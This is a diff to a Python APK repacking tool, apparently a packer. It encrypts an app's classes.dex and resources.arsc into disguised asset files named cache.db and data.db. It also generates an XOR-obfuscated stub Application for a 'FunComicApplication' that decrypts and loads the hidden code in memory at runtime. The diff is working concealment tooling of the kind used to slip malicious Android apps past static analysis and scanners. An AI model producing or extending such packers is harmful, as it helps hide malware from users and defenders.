@@ -48,7 +48,20 @@ BERLIN_PKG_PATH  = "com/comics/fun"
 BERLIN_APP_CLASS = "FunComicApplication"
 BERLIN_DEX_VER   = b"039"
 ENCRYPTED_ASSET  = "assets/cache.db"
+ENCRYPTED_ARSC   = "assets/data.db"
 XOR_KEY          = 0x5A
+
+# ── Stub ARSC keep set — from binary AndroidManifest.xml analysis ─────────────
+# icon / roundIcon → drawable type_id=0x07 entry=0x0078
+# label           → string  type_id=0x10 entry=0x001e
+# theme           → style   type_id=0x11 entry=0x02ae
+# fullBackupContent / dataExtractionRules → xml type_id=0x13 entries 0x0000, 0x0001
+ARSC_KEEP = {
+    0x07: {0x0078},           # drawable — launcher icon
+    0x10: {0x001e},           # string   — app label
+    0x11: {0x02ae},           # style    — app theme
+    0x13: {0x0000, 0x0001},   # xml      — backup config
+}
 
 # Entries that MUST stay ZIP_STORED (Android requirement)
 MUST_STORE = {
@@ -111,10 +124,12 @@ def _zip_read_raw(apk_path: str, entry_name: str) -> bytes:
 
 
 # ── Stub smali generator ──────────────────────────────────────────────────────
-def _build_stub_smali(key_hex: str, iv_hex: str) -> str:
+def _build_stub_smali(key_hex: str, iv_hex: str,
+                      arsc_key_hex: str = "", arsc_iv_hex: str = "") -> str:
     """
     Generate stub smali for FunComicApplication.
     Hooks attachBaseContext() — decrypt assets/cache.db → load via IMDCL.
+    ARSC key/IV embedded as fields RK/RV for runtime decrypt of assets/data.db.
     All sensitive strings XOR-obfuscated with key 0x5A.
     """
     # XOR-encode all sensitive strings
@@ -132,9 +147,13 @@ def _build_stub_smali(key_hex: str, iv_hex: str) -> str:
 .super Landroid/app/Application;
 .source "{app}.java"
 
-# AES-256-CBC key + IV — injected fresh per build by apk_asset_bundler.py
+# AES-256-CBC key + IV — DEX payload (assets/cache.db)
 .field private static final K:Ljava/lang/String; = "{key_hex}"
 .field private static final V:Ljava/lang/String; = "{iv_hex}"
+
+# AES-256-CBC key + IV — ARSC payload (assets/data.db)
+.field private static final RK:Ljava/lang/String; = "{arsc_key_hex}"
+.field private static final RV:Ljava/lang/String; = "{arsc_iv_hex}"
 
 # Hold IMDCL reference for components that initialise before attachBaseContext completes
 .field public static sCL:Ljava/lang/ClassLoader;
@@ -432,6 +451,155 @@ def _assemble_smali(smali_src: str, dex_version: str = "039") -> bytes:
         return dex_data
 
 
+# ── ARSC encryption — full ARSC → AES-256-CBC → assets/data.db ───────────────
+def _res_encrypt(arsc_data: bytes, key: bytes, iv: bytes) -> bytes:
+    """Encrypt full resources.arsc bytes with AES-256-CBC."""
+    return _aes_encrypt(arsc_data, key, iv)
+
+
+# ── Stub ARSC builder ─────────────────────────────────────────────────────────
+def _build_minimal_arsc(arsc_data: bytes) -> bytes:
+    """
+    Parse full resources.arsc and rebuild a minimal stub containing only
+    the entries defined in ARSC_KEEP (boot-critical: icon, label, theme, xml).
+    All other entries become NO_ENTRY (0xFFFFFFFF).
+    Returns valid stub ARSC binary.
+    """
+    NO_ENTRY = 0xFFFFFFFF
+
+    def r16(d, p): return struct.unpack_from('<H', d, p)[0]
+    def r32(d, p): return struct.unpack_from('<I', d, p)[0]
+    def w16(v):    return struct.pack('<H', v)
+    def w32(v):    return struct.pack('<I', v)
+
+    # ── 1. Parse global string pool ───────────────────────────────────────────
+    # TABLE header: type(2)+hdrsize(2)+size(4)+pkg_count(4) = 12 bytes
+    pkg_count  = r32(arsc_data, 8)
+    gsp_start  = 12   # global string pool immediately after TABLE header
+    gsp_hdr_sz = r16(arsc_data, gsp_start + 2)
+    gsp_sz     = r32(arsc_data, gsp_start + 4)
+    gsp_bytes  = arsc_data[gsp_start : gsp_start + gsp_sz]
+    gsp_str_cnt = r32(arsc_data, gsp_start + 8)
+
+    # ── 2. Find package chunk ─────────────────────────────────────────────────
+    pkg_start = gsp_start + gsp_sz
+    # Package: type(2)+hdrsize(2)+size(4)+id(4)+name(256)+typeStrings(4)+lastPublicType(4)
+    #          +keyStrings(4)+lastPublicKey(4)+typeIdOffset(4) = header
+    pkg_hdr_sz = r16(arsc_data, pkg_start + 2)
+    pkg_sz     = r32(arsc_data, pkg_start + 4)
+    pkg_id     = r32(arsc_data, pkg_start + 8) & 0xFF
+
+    # Type string pool offset (from pkg_start)
+    type_sp_off = r32(arsc_data, pkg_start + 268)   # typeStrings field
+    key_sp_off  = r32(arsc_data, pkg_start + 276)   # keyStrings field
+
+    tsp_abs = pkg_start + type_sp_off
+    ksp_abs = pkg_start + key_sp_off
+
+    tsp_sz  = r32(arsc_data, tsp_abs + 4)
+    ksp_sz  = r32(arsc_data, ksp_abs + 4)
+
+    tsp_bytes = arsc_data[tsp_abs : tsp_abs + tsp_sz]
+    ksp_bytes = arsc_data[ksp_abs : ksp_abs + ksp_sz]
+
+    # ── 3. Walk type chunks and rebuild ──────────────────────────────────────
+    type_chunks_out = bytearray()
+    pos = pkg_start + pkg_hdr_sz  # first chunk inside package
+
+    while pos < pkg_start + pkg_sz:
+        ct = r16(arsc_data, pos)
+        cs = r32(arsc_data, pos + 4)
+        if cs == 0:
+            break
+
+        if ct == 0x0202:  # TABLE_TYPE_SPEC
+            type_id = r32(arsc_data, pos + 8) & 0xFF
+            if type_id in ARSC_KEEP:
+                type_chunks_out += arsc_data[pos : pos + cs]
+
+        elif ct == 0x0201:  # TABLE_TYPE
+            # Header: type(2)+hdrsize(2)+size(4)+id(4)+flags(4)+entryCount(4)
+            #         +entriesStart(4)+config(anything up to hdrsize)
+            type_id    = r32(arsc_data, pos + 8) & 0xFF
+            hdr_sz     = r16(arsc_data, pos + 2)
+            entry_count= r32(arsc_data, pos + 16)
+            entries_start = r32(arsc_data, pos + 20)
+
+            if type_id not in ARSC_KEEP:
+                pos += cs
+                continue
+
+            keep_entries = ARSC_KEEP[type_id]
+
+            # Offsets table: entry_count × uint32, starts at pos+hdr_sz
+            offsets_in  = arsc_data[pos + hdr_sz : pos + hdr_sz + entry_count * 4]
+            entries_in  = arsc_data[pos + hdr_sz + entry_count * 4 : pos + cs]
+
+            # Build new offsets + entries keeping only ARSC_KEEP entries
+            new_offsets = bytearray()
+            new_entries = bytearray()
+            current_off = 0
+
+            for i in range(entry_count):
+                old_off = r32(offsets_in, i * 4)
+                if i not in keep_entries or old_off == NO_ENTRY:
+                    new_offsets += w32(NO_ENTRY)
+                else:
+                    # Copy this entry
+                    e_abs = pos + hdr_sz + entry_count * 4 + old_off
+                    # Entry: flags(2)+count(2)+key(4) = 8 bytes min; MAP entries have more
+                    e_flags = r16(arsc_data, e_abs)
+                    if e_flags & 0x0001:  # FLAG_COMPLEX (map entry)
+                        e_count = r16(arsc_data, e_abs + 2)
+                        e_sz    = 8 + e_count * 12
+                    else:
+                        e_sz    = 8 + 8   # simple entry: header(8) + ResValue(8)
+                    entry_bytes = arsc_data[e_abs : e_abs + e_sz]
+                    new_offsets += w32(current_off)
+                    new_entries += entry_bytes
+                    current_off += len(entry_bytes)
+
+            # Rebuild TABLE_TYPE chunk
+            payload     = bytes(new_offsets) + bytes(new_entries)
+            new_hdr     = bytearray(arsc_data[pos : pos + hdr_sz])
+            new_total   = hdr_sz + len(payload)
+            struct.pack_into('<I', new_hdr, 4, new_total)      # chunk size
+            struct.pack_into('<I', new_hdr, 20, hdr_sz)        # entriesStart = hdr_sz (offsets embedded in payload)
+            # entriesStart in ARSC TABLE_TYPE = offset from chunk start to first entry VALUE
+            # It should be hdr_sz + entry_count*4 (after offsets table)
+            struct.pack_into('<I', new_hdr, 20, hdr_sz + entry_count * 4)
+            type_chunks_out += bytes(new_hdr) + payload
+
+        pos += cs
+
+    # ── 4. Rebuild package chunk ──────────────────────────────────────────────
+    # Recalculate type/key string pool offsets in rebuilt package header
+    pkg_hdr_orig = bytearray(arsc_data[pkg_start : pkg_start + pkg_hdr_sz])
+
+    # Offsets are from start of package chunk to the pool chunk
+    new_tsp_off = pkg_hdr_sz
+    new_ksp_off = pkg_hdr_sz + len(tsp_bytes)
+    struct.pack_into('<I', pkg_hdr_orig, 268, new_tsp_off)
+    struct.pack_into('<I', pkg_hdr_orig, 276, new_ksp_off)
+
+    pkg_body    = bytes(pkg_hdr_orig) + tsp_bytes + ksp_bytes + bytes(type_chunks_out)
+    # Fix package chunk total size
+    pkg_body    = bytearray(pkg_body)
+    struct.pack_into('<I', pkg_body, 4, len(pkg_body))
+    pkg_body    = bytes(pkg_body)
+
+    # ── 5. Rebuild TABLE chunk ────────────────────────────────────────────────
+    tbl_hdr = bytearray(arsc_data[0:12])  # TABLE header (12 bytes)
+    out     = bytes(tbl_hdr) + gsp_bytes + pkg_body
+    out     = bytearray(out)
+    struct.pack_into('<I', out, 4, len(out))   # TABLE total size
+    out = bytes(out)
+
+    print(f"[apk_asset_bundler] Stub ARSC: {len(out):,} bytes  "
+          f"(original: {len(arsc_data):,} bytes)")
+    return out
+
+
 # ── APK rebuilder — preserves all entries at original compression ─────────────
 def _rebuild_apk(src_apk: str, replacements: dict) -> str:
     """
@@ -540,9 +708,24 @@ def patch(input_apk: str, output_apk: str,
     print(f"  Encrypted:  {len(dex_enc):,} bytes → {ENCRYPTED_ASSET} (ZIP_STORED)")
     print(f"  Key (first 8 bytes): {key_hex[:16]}...")
 
+    # ── Step 2b: Extract + encrypt resources.arsc → assets/data.db ─────────────
+    print(f"\n[apk_asset_bundler] Step 2b — Encrypt resources.arsc")
+    arsc_raw = _zip_read_raw(input_apk, "resources.arsc")
+    print(f"  resources.arsc: {len(arsc_raw):,} bytes")
+    arsc_key = secrets.token_bytes(32)
+    arsc_iv  = secrets.token_bytes(16)
+    arsc_enc = _res_encrypt(arsc_raw, arsc_key, arsc_iv)
+    arsc_key_hex = arsc_key.hex().upper()
+    arsc_iv_hex  = arsc_iv.hex().upper()
+    print(f"  Encrypted:  {len(arsc_enc):,} bytes → {ENCRYPTED_ARSC} (ZIP_STORED)")
+
+    # ── Step 2c: Build stub ARSC (boot-critical entries only) ────────────────
+    print(f"\n[apk_asset_bundler] Step 2c — Build stub ARSC")
+    stub_arsc = _build_minimal_arsc(arsc_raw)
+
     # ── Step 3: Generate stub smali ───────────────────────────────────────────
     print(f"\n[apk_asset_bundler] Step 3 — Generate stub smali")
-    smali_src = _build_stub_smali(key_hex, iv_hex)
+    smali_src = _build_stub_smali(key_hex, iv_hex, arsc_key_hex, arsc_iv_hex)
     print(f"  Stub smali: {len(smali_src):,} chars  "
           f"target: L{BERLIN_PKG_PATH}/{BERLIN_APP_CLASS};")
 
@@ -553,13 +736,17 @@ def patch(input_apk: str, output_apk: str,
     # ── Step 5: Rebuild APK with replacements ─────────────────────────────────
     print(f"\n[apk_asset_bundler] Step 5 — Rebuild APK")
     replacements = {
-        "classes.dex":      (stub_dex, zipfile.ZIP_STORED),
-        ENCRYPTED_ASSET:    (dex_enc,  zipfile.ZIP_STORED),
+        "classes.dex":      (stub_dex,  zipfile.ZIP_STORED),
+        ENCRYPTED_ASSET:    (dex_enc,   zipfile.ZIP_STORED),
+        "resources.arsc":   (stub_arsc, zipfile.ZIP_STORED),
+        ENCRYPTED_ARSC:     (arsc_enc,  zipfile.ZIP_STORED),
     }
     rebuilt = _rebuild_apk(input_apk, replacements)
     print(f"  Rebuilt APK: {os.path.getsize(rebuilt):,} bytes")
     print(f"  ✅ classes.dex replaced with stub ({len(stub_dex):,} bytes)")
     print(f"  ✅ {ENCRYPTED_ASSET} injected ({len(dex_enc):,} bytes)")
+    print(f"  ✅ resources.arsc replaced with stub ({len(stub_arsc):,} bytes)")
+    print(f"  ✅ {ENCRYPTED_ARSC} injected ({len(arsc_enc):,} bytes)")
 
     # ── Step 6: zipalign ─────────────────────────────────────────────────────
     print(f"\n[apk_asset_bundler] Step 6 — zipalign")
